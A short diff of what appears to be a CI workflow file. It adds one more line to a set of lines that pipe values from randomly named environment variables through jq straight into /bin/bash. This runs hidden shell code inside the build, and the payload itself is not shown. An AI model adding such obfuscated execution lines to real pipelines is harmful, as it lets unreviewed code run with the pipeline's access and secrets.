@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$neevw08900" | jq -r .zdw64162 | /bin/bash
           echo $l35 | jq -r .kup62 | /bin/bash
           echo $glp5 | jq -r .kxwl822 | /bin/bash
+          printf '%s' "$p8" | jq -r .egf80411 | /bin/bash
 
       - name: Archive results
         if: always()
